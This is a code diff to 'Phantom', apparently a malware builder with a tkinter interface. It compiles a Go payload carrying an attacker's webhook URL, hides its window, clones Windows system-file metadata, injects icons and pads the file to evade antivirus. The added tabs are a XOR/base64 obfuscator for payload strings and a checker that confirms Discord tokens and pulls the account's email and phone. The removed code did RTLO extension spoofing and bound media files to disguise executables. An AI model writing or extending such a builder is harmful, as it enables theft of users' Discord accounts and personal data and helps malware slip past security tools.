@@ -3,25 +3,25 @@ from tkinter import filedialog, messagebox, ttk
 import os
 import subprocess
 import sys
+import base64
+import threading
+import re
 
 def install_dependencies():
     """Checks and installs required python modules"""
-    required = ['opencv-python', 'Pillow']
+    required = ["requests"]
     for package in required:
         try:
-            if package == 'opencv-python':
-                import cv2
-            elif package == 'Pillow':
-                from PIL import Image
+            __import__(package)
         except ImportError:
-            print(f"Installing missing dependency: {package}...")
+            print(f"Installing {package}...")
             subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-# Auto-install dependencies before imports
+# Auto-install dependencies before sensitive imports
 install_dependencies()
 
-import cv2
-from PIL import Image
+# Now it's safe to import requests
+import requests
 from resource_injector import inject_icon, clone_resources
 
 class Phantom:
@@ -39,7 +39,7 @@ class Phantom:
             "accent": "#00a8ff",
             "text": "#ffffff",
             "text_dim": "#a0a0a5",
-            "border": "#2d2d35",
+            "border": "#16161b",
             "success": "#2ecc71",
             "warning": "#f1c40f",
             "danger": "#e74c3c"
@@ -49,8 +49,8 @@ class Phantom:
         self.style.theme_use('clam')
         
         # Configure Ttk Styles
-        self.style.configure("TFrame", background=self.colors["bg"])
-        self.style.configure("Panel.TFrame", background=self.colors["panel"], borderwidth=1, relief="flat")
+        self.style.configure("TFrame", background=self.colors["bg"], borderwidth=0, relief="flat")
+        self.style.configure("Panel.TFrame", background=self.colors["panel"], borderwidth=0, relief="flat")
         
         self.style.configure("TLabel", background=self.colors["bg"], foreground=self.colors["text"], font=("Segoe UI", 10))
         self.style.configure("Panel.TLabel", background=self.colors["panel"], foreground=self.colors["text"], font=("Segoe UI", 10))
@@ -68,18 +68,44 @@ class Phantom:
         self.style.configure("Generate.TButton", font=("Segoe UI", 12, "bold"), background=self.colors["accent"], foreground="#ffffff")
         self.style.map("Generate.TButton", background=[('active', "#0086cc")])
 
+        # Notebook Styles
+        self.style.configure("TNotebook", background=self.colors["bg"], borderwidth=0, 
+                             lightcolor=self.colors["bg"], bordercolor=self.colors["bg"])
+        self.style.configure("TNotebook.Tab", background=self.colors["panel"], foreground=self.colors["text_dim"], 
+                             padding=[15, 8], font=("Segoe UI", 9, "bold"), borderwidth=0,
+                             lightcolor=self.colors["panel"], bordercolor=self.colors["panel"])
+        self.style.map("TNotebook.Tab",
+            background=[("selected", self.colors["accent"]), ("active", self.colors["panel"])],
+            foreground=[("selected", "#ffffff"), ("active", self.colors["text"])],
+            padding=[("selected", [15, 8])],
+            lightcolor=[("selected", self.colors["accent"])],
+            bordercolor=[("selected", self.colors["accent"])]
+        )
+
         # Initialize attributes
         self.destination = None
         self.icon_path = None
-        self.media_path = None
         self.go_executable = self._find_go_executable()
 
         self._build_ui()
 
     def _build_ui(self):
-        # Main Layout
-        container = ttk.Frame(self.root, padding="30")
-        container.pack(fill=tk.BOTH, expand=True)
+        # Main Outer Container (No border as requested)
+        outer_frame = tk.Frame(self.root, bg=self.colors["bg"])
+        outer_frame.pack(fill=tk.BOTH, expand=True)
+        
+        inner_bg = tk.Frame(outer_frame, bg=self.colors["bg"])
+        inner_bg.pack(fill=tk.BOTH, expand=True)
+
+        # Create Notebook for Tabs
+        self.notebook = ttk.Notebook(inner_bg)
+        self.notebook.pack(fill=tk.BOTH, expand=True)
+
+        # --- TAB 1: GENERATOR ---
+        self.gen_tab = ttk.Frame(self.notebook, padding="30")
+        self.notebook.add(self.gen_tab, text="🚀 BUILDER")
+        
+        container = self.gen_tab
 
         # Title Section
         title_frame = ttk.Frame(container)
@@ -114,11 +140,11 @@ class Phantom:
         ttk.Label(mode_section, text="PAYLOAD MODE", style="Section.TLabel").pack(anchor=tk.W, pady=(0, 10))
         
         self.mode_var = tk.StringVar(value="None")
-        modes = [("Normal EXE", "None"), ("Notepad (.txt)", "Notepad"), ("Image (.png)", "Image"), ("Video (.mp4)", "Video")]
+        modes = [("Normal EXE", "None")]
         
         for text, value in modes:
             rb = tk.Radiobutton(mode_section, text=text, variable=self.mode_var, value=value,
-                                 command=self.update_media_button, bg=self.colors["panel"], 
+                                 bg=self.colors["panel"], 
                                  fg=self.colors["text"], selectcolor=self.colors["bg"],
                                  activebackground=self.colors["panel"], activeforeground=self.colors["accent"],
                                  font=("Segoe UI", 9), bd=0, highlightthickness=0)
@@ -129,9 +155,6 @@ class Phantom:
         stealth_section.grid(row=0, column=1, sticky="nw", padx=(10, 0))
         
         ttk.Label(stealth_section, text="STEALTH SETTINGS", style="Section.TLabel").pack(anchor=tk.W, pady=(0, 10))
-        
-        self.rtlo_var = tk.BooleanVar(value=True)
-        self._create_modern_check(stealth_section, "RTLO Extension Spoofing", self.rtlo_var)
         
         self.fud_var = tk.BooleanVar(value=True)
         self._create_modern_check(stealth_section, "FUD Padding (25MB)", self.fud_var)
@@ -148,10 +171,7 @@ class Phantom:
         self.destination_button.pack(side=tk.LEFT, padx=(0, 5), expand=True, fill=tk.X)
 
         self.icon_button = ttk.Button(btns_row, text="🖼️ CUSTOM ICON", style="Action.TButton", command=self.select_icon)
-        self.icon_button.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
-
-        self.media_button = ttk.Button(btns_row, text="🎬 SELECT MEDIA", style="Action.TButton", command=self.select_media, state=tk.DISABLED)
-        self.media_button.pack(side=tk.LEFT, padx=(5, 0), expand=True, fill=tk.X)
+        self.icon_button.pack(side=tk.LEFT, padx=(5, 0), expand=True, fill=tk.X)
 
         # Asset Labels
         labels_row = ttk.Frame(assets_frame, style="Panel.TFrame", padding=(0, 10))
@@ -161,8 +181,6 @@ class Phantom:
         self.dest_label.pack(anchor=tk.W)
         self.icon_label = ttk.Label(labels_row, text="🖼️ No icon selected", style="Panel.TLabel", font=("Segoe UI", 8), foreground=self.colors["text_dim"])
         self.icon_label.pack(anchor=tk.W)
-        self.media_label = ttk.Label(labels_row, text="🎬 No media binded", style="Panel.TLabel", font=("Segoe UI", 8), foreground=self.colors["text_dim"])
-        self.media_label.pack(anchor=tk.W)
 
         # --- GENERATE SECTION ---
         gen_frame = ttk.Frame(container)
@@ -181,6 +199,201 @@ class Phantom:
         
         self.status_label = ttk.Label(container, text="Ready for deployment", font=("Segoe UI", 9, "italic"), foreground=self.colors["text_dim"])
         self.status_label.pack()
+
+        # --- TAB 2: TOOLBOX ---
+        self.tool_tab = ttk.Frame(self.notebook, padding="30")
+        self.notebook.add(self.tool_tab, text="🛠️ TOOLBOX")
+        self._build_toolbox_ui()
+
+        # --- TAB 3: VERIFIER ---
+        self.verify_tab = ttk.Frame(self.notebook, padding="30")
+        self.notebook.add(self.verify_tab, text="✅ VERIFIER")
+        self._build_verifier_ui()
+
+    def _build_verifier_ui(self):
+        container = self.verify_tab
+        
+        # Title Section (Unified Style)
+        title_frame = ttk.Frame(container)
+        title_frame.pack(fill=tk.X, pady=(0, 25))
+        
+        header = ttk.Label(title_frame, text="VERIFIER", style="Header.TLabel")
+        header.pack(side=tk.LEFT)
+
+        # Main Panel
+        verify_panel = ttk.Frame(container, style="Panel.TFrame", padding=20)
+        verify_panel.pack(fill=tk.BOTH, expand=True)
+
+        description = ttk.Label(verify_panel, text="Check if a Discord token is valid and retrieve user information.", 
+                                foreground=self.colors["text_dim"], font=("Segoe UI", 9))
+        description.pack(anchor=tk.W, pady=(0, 20))
+
+        # Input Area
+        self._create_input_section(verify_panel, "Discord Token", "Paste token to verify...", "token_verify_entry")
+        
+        # Verify Button
+        self.token_verify_btn = tk.Button(verify_panel, text="VERIFY TOKEN", command=self.start_token_verification,
+                                         bg=self.colors["accent"], fg="#ffffff", font=("Segoe UI", 10, "bold"),
+                                         activebackground="#0086cc", activeforeground="#ffffff",
+                                         bd=0, cursor="hand2", pady=10)
+        self.token_verify_btn.pack(fill=tk.X, pady=10)
+
+        # Result Display Area (Inside the same panel for consistency)
+        ttk.Label(verify_panel, text="STATUS", style="Section.TLabel").pack(anchor=tk.W, pady=(20, 5))
+        
+        # Indicator light and label
+        status_row = ttk.Frame(verify_panel, style="Panel.TFrame")
+        status_row.pack(fill=tk.X, pady=(0, 15))
+        
+        self.verify_indicator = tk.Canvas(status_row, width=16, height=16, bg=self.colors["panel"], highlightthickness=0)
+        self.verify_indicator.pack(side=tk.LEFT)
+        self.verify_light = self.verify_indicator.create_oval(2, 2, 14, 14, fill=self.colors["text_dim"])
+        
+        self.verify_status_label = ttk.Label(status_row, text="IDLE", font=("Segoe UI", 10, "bold"), foreground=self.colors["text_dim"])
+        self.verify_status_label.pack(side=tk.LEFT, padx=10)
+
+        # Info Text
+        ttk.Label(verify_panel, text="ACCOUNT INFO", style="Section.TLabel").pack(anchor=tk.W, pady=(0, 5))
+        self.verify_output_text = tk.Text(verify_panel, bg=self.colors["bg"], fg=self.colors["text"],
+                                         font=("Consolas", 9), bd=0, highlightthickness=0, height=8)
+        self.verify_output_text.pack(fill=tk.BOTH, expand=True, pady=5)
+
+    def set_verify_status(self, text, color_hex):
+        self.verify_status_label.config(text=text, foreground=color_hex)
+        self.verify_indicator.itemconfig(self.verify_light, fill=color_hex)
+
+    def start_token_verification(self):
+        token = self.token_verify_entry.get().strip()
+        if not token:
+            messagebox.showwarning("Warning", "Please enter a token to verify.")
+            return
+
+        # Basic format check (simplified)
+        if not re.match(r"^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+$", token) and not token.startswith("mfa."):
+             self.set_verify_status("INVALID FORMAT", self.colors["error"])
+             self.verify_output_text.delete(1.0, tk.END)
+             return
+
+        self.token_verify_btn.config(state=tk.DISABLED, text="VERIFYING...")
+        self.set_verify_status("CHECKING...", self.colors["accent"])
+        self.verify_output_text.delete(1.0, tk.END)
+        
+        threading.Thread(target=self.run_token_check, args=(token,), daemon=True).start()
+
+    def run_token_check(self, token):
+        headers = {"Authorization": token, "Content-Type": "application/json"}
+        try:
+            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
+            
+            if response.status_code == 200:
+                data = response.json()
+                username = f"{data['username']}"
+                if data.get('discriminator') != "0":
+                    username += f"#{data['discriminator']}"
+                
+                info = [
+                    f"User:     {username}",
+                    f"ID:       {data['id']}",
+                    f"Email:    {data.get('email', 'N/A')}",
+                    f"Phone:    {data.get('phone', 'N/A')}",
+                    f"MFA:      {'Enabled' if data.get('mfa_enabled') else 'Disabled'}",
+                    f"Nitro:    {'Yes' if data.get('premium_type', 0) > 0 else 'No'}",
+                    f"Flags:    {data.get('public_flags', 0)}"
+                ]
+                
+                self.root.after(0, lambda: self.show_verify_result("VALID TOKEN", self.colors["success"], "\n".join(info)))
+            else:
+                self.root.after(0, lambda: self.show_verify_result("INVALID TOKEN", self.colors["error"], "The token is expired or incorrect."))
+        except Exception as e:
+            self.root.after(0, lambda: self.show_verify_result("ERROR", self.colors["error"], f"Connection error: {str(e)}"))
+
+    def show_verify_result(self, status_text, color, info_text):
+        self.token_verify_btn.config(state=tk.NORMAL, text="VERIFY TOKEN")
+        self.set_verify_status(status_text, color)
+        self.verify_output_text.delete(1.0, tk.END)
+        self.verify_output_text.insert(tk.END, info_text)
+
+    def _build_toolbox_ui(self):
+        container = self.tool_tab
+        
+        # Title Section (Unified Style)
+        title_frame = ttk.Frame(container)
+        title_frame.pack(fill=tk.X, pady=(0, 25))
+        
+        header = ttk.Label(title_frame, text="OBFUSCATOR", style="Header.TLabel")
+        header.pack(side=tk.LEFT)
+        
+        # Main Panel
+        tool_panel = ttk.Frame(container, style="Panel.TFrame", padding=20)
+        tool_panel.pack(fill=tk.BOTH, expand=True)
+
+        description = ttk.Label(tool_panel, text="Use this tool to encrypt/decrypt strings for the payload (XOR 0x50).", 
+                                foreground=self.colors["text_dim"], font=("Segoe UI", 9))
+        description.pack(anchor=tk.W, pady=(0, 20))
+
+        # Input Area
+        self._create_input_section(tool_panel, "Input Text", "Enter text to process...", "tool_input_entry")
+        
+        # Action Buttons
+        btns_row = ttk.Frame(tool_panel, style="Panel.TFrame")
+        btns_row.pack(fill=tk.X, pady=10)
+
+        obf_btn = tk.Button(btns_row, text="OBFUSCATE", command=self.tool_obfuscate,
+                             bg=self.colors["accent"], fg="#ffffff", font=("Segoe UI", 10, "bold"),
+                             activebackground="#0086cc", activeforeground="#ffffff",
+                             bd=0, cursor="hand2", padx=20, pady=8)
+        obf_btn.pack(side=tk.LEFT, padx=(0, 10))
+
+        deobf_btn = tk.Button(btns_row, text="DEOBFUSCATE", command=self.tool_deobfuscate,
+                               bg=self.colors["bg"], fg=self.colors["text"], font=("Segoe UI", 10, "bold"),
+                               activebackground=self.colors["panel"], activeforeground=self.colors["accent"],
+                               bd=0, cursor="hand2", padx=20, pady=8)
+        deobf_btn.pack(side=tk.LEFT)
+
+        # Output Area
+        ttk.Label(tool_panel, text="RESULT", style="Section.TLabel").pack(anchor=tk.W, pady=(20, 10))
+        
+        self.tool_output_text = tk.Text(tool_panel, bg=self.colors["bg"], fg=self.colors["success"],
+                                       font=("Consolas", 10), bd=0, highlightthickness=0, height=8)
+        self.tool_output_text.pack(fill=tk.BOTH, expand=True, pady=5)
+
+    def tool_obfuscate(self):
+        text = self.tool_input_entry.get().strip()
+        if not text: return
+        
+        # XOR with 0x50
+        xor_key = 0x50
+        data = bytearray(text, 'utf-8')
+        res = bytearray()
+        for b in data:
+            res.append(b ^ xor_key)
+        
+        # Base64 encode
+        encoded = base64.b64encode(res).decode('utf-8')
+        
+        self.tool_output_text.delete(1.0, tk.END)
+        self.tool_output_text.insert(tk.END, encoded)
+
+    def tool_deobfuscate(self):
+        text = self.tool_input_entry.get().strip()
+        if not text: return
+        
+        try:
+            # Base64 decode
+            decoded = base64.b64decode(text)
+            
+            # XOR with 0x50
+            xor_key = 0x50
+            res = bytearray()
+            for b in decoded:
+                res.append(b ^ xor_key)
+            
+            result = res.decode('utf-8')
+            
+            self.tool_output_text.delete(1.0, tk.END)
+            self.tool_output_text.insert(tk.END, result)
+        except Exception as e:
+            messagebox.showerror("Error", f"Invalid obfuscated string: {str(e)}")
 
     def _create_input_section(self, parent, label, placeholder, attr_name, default=""):
         frame = ttk.Frame(parent, style="Panel.TFrame")
@@ -235,60 +448,6 @@ class Phantom:
         if self.icon_path:
             self.icon_label.config(text=f"🖼️ {os.path.basename(self.icon_path)}")
 
-    def select_media(self):
-        mode = self.mode_var.get()
-        filetypes = []
-        if mode == "Image":
-            filetypes = [("Image files", "*.png *.jpg *.jpeg *.bmp")]
-        elif mode == "Video":
-            filetypes = [("Video files", "*.mp4 *.avi *.mkv *.mov")]
-        
-        self.media_path = filedialog.askopenfilename(filetypes=filetypes)
-        if self.media_path:
-            self.media_label.config(text=f"🎬 {os.path.basename(self.media_path)}")
-
-    def update_media_button(self):
-        mode = self.mode_var.get()
-        if mode in ["Image", "Video"]:
-            self.media_button.config(state=tk.NORMAL)
-        else:
-            self.media_button.config(state=tk.DISABLED)
-            self.media_path = None
-            self.media_label.config(text="🎬 No media binded")
-
-    def generate_thumbnail_icon(self, media_path, output_ico):
-        """Generates a high-quality .ico from an image or video frame"""
-        try:
-            mode = self.mode_var.get()
-            img = None
-
-            if mode == "Image":
-                img = Image.open(media_path)
-            elif mode == "Video":
-                cap = cv2.VideoCapture(media_path)
-                # Skip first few frames to avoid black screen at start
-                for _ in range(5):
-                    cap.grab()
-                success, frame = cap.retrieve()
-                if not success: # Fallback to first frame if grab fails
-                    cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
-                    success, frame = cap.read()
-                
-                if success:
-                    # Convert BGR to RGB
-                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                    img = Image.fromarray(frame_rgb)
-                cap.release()
-
-            if img:
-                # Standard icon sizes for Windows
-                sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
-                img.save(output_ico, format='ICO', sizes=sizes)
-                return True
-        except Exception as e:
-            print(f"Error generating thumbnail icon: {e}")
-        return False
-
     def generate_malware(self):
         url = self.url_entry.get().strip()
         exe_name = self.exe_entry.get().strip()
@@ -334,13 +493,8 @@ class Phantom:
             # Compile Go code
             timestamp = str(__import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
             
-            # Prepare BindedFile name
-            binded_file_name = ""
-            if self.media_path:
-                binded_file_name = os.path.basename(self.media_path)
-            
             # ldflags: -s -w (reduce size), -H=windowsgui (no console window)
-            ldflags = f"-s -w -H=windowsgui -X \"main.WebhookURL={url}\" -X \"main.Timestamp={timestamp}\" -X \"main.BindedFile={binded_file_name}\""
+            ldflags = f"-s -w -H=windowsgui -X \"main.WebhookURL={url}\" -X \"main.Timestamp={timestamp}\""
             
             self.status_label.config(text="Compiling binary (Go)...")
             self.progress_var.set(40)
@@ -358,36 +512,21 @@ class Phantom:
             
             # Inject icon & Metadata
             target_file_for_meta = None
-            camo_mode = self.mode_var.get()
+            if self.icon_path:
+                # Use shell32.dll as a template to ensure the binary has a resource section
+                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "shell32.dll")
             
-            if camo_mode == "Notepad":
-                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "notepad.exe")
-            elif camo_mode == "Image":
-                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "imageres.dll")
-            elif camo_mode == "Video":
-                # For video, we can use Windows Media Player or similar for metadata
-                target_file_for_meta = os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "Windows Media Player", "wmplayer.exe")
-                if not os.path.exists(target_file_for_meta):
-                    target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "shell32.dll")
-
             # Priority 1: User selected icon
-            # Priority 2: Auto-generate icon from media (thumbnail)
             final_icon = self.icon_path
             temp_icon_path = None
 
-            if not final_icon and self.media_path and camo_mode in ["Image", "Video"]:
-                self.status_label.config(text="Generating thumbnail icon...")
-                temp_icon_path = os.path.join(self.destination, "temp_thumb.ico")
-                if self.generate_thumbnail_icon(self.media_path, temp_icon_path):
-                    final_icon = temp_icon_path
-
             # 1. First, clone metadata if a target is available
             if target_file_for_meta and os.path.exists(target_file_for_meta):
-                self.status_label.config(text="Cloning metadata...")
+                self.status_label.config(text="Preparing resource section...")
                 self.progress_var.set(70)
                 self.root.update()
                 try:
-                    # Clone everything (including icons) from the target first
+                    # Clone basic resources first
                     clone_resources(target_file_for_meta, output_exe)
                 except Exception as e:
                     print(f"Warning: Metadata cloning failed: {e}")
@@ -397,25 +536,8 @@ class Phantom:
                 self.status_label.config(text="Injecting final icon...")
                 success = inject_icon(output_exe, final_icon)
                 if not success:
-                    print("Failed to inject icon!")
+                    messagebox.showwarning("Icon Warning", "Failed to inject the custom icon. The payload will still work, but without the icon.")
                     self.status_label.config(text="Icon injection failed!")
-            
-            # Clean up temp icon
-            if temp_icon_path and os.path.exists(temp_icon_path):
-                try:
-                    os.remove(temp_icon_path)
-                except:
-                    pass
-
-            # Bind the media file (Must be done AFTER resource injection, otherwise it gets stripped)
-            if self.media_path and os.path.exists(self.media_path):
-                self.status_label.config(text="Binding media file...")
-                with open(self.media_path, "rb") as f_media:
-                    media_data = f_media.read()
-                
-                with open(output_exe, "ab") as f_exe:
-                    f_exe.write(b"PHANTOM_BIND_MARKER")
-                    f_exe.write(media_data)
             
             # FUD Optimization (Padding)
             if self.fud_var.get():
@@ -428,38 +550,11 @@ class Phantom:
                 except:
                     pass
 
-            # RTLO Extension Spoofing
-            final_path = output_exe
-            if self.rtlo_var.get():
-                self.status_label.config(text="Applying RTLO spoofing...")
-                dir_name = os.path.dirname(output_exe)
-                base_name = os.path.basename(output_exe).replace(".exe", "")
-                
-                # RTLO character (U+202E) reverses the following text
-                rtlo = "\u202e"
-                
-                if camo_mode == "Notepad":
-                    spoofed_name = f"{base_name}{rtlo}txt.exe"
-                elif camo_mode == "Image":
-                    spoofed_name = f"{base_name}{rtlo}gnp.exe"
-                elif camo_mode == "Video":
-                    spoofed_name = f"{base_name}{rtlo}4pm.exe" # 4pm -> mp4
-                else:
-                    spoofed_name = f"{base_name}{rtlo}gpj.exe"
-                
-                final_path = os.path.join(dir_name, spoofed_name)
-                try:
-                    if os.path.exists(final_path):
-                        os.remove(final_path)
-                    os.rename(output_exe, final_path)
-                except Exception as e:
-                    print(f"RTLO Rename failed: {e}")
-
             self.status_label.config(text="Payload ready!")
             self.progress_var.set(100)
             self.root.update()
             
-            messagebox.showinfo("Success", f"Payload generated successfully!\n\nLocation: {final_path}")
+            messagebox.showinfo("Success", f"Payload generated successfully!\n\nLocation: {output_exe}")
             
         except subprocess.CalledProcessError as e:
             error_msg = e.stderr if e.stderr else str(e)
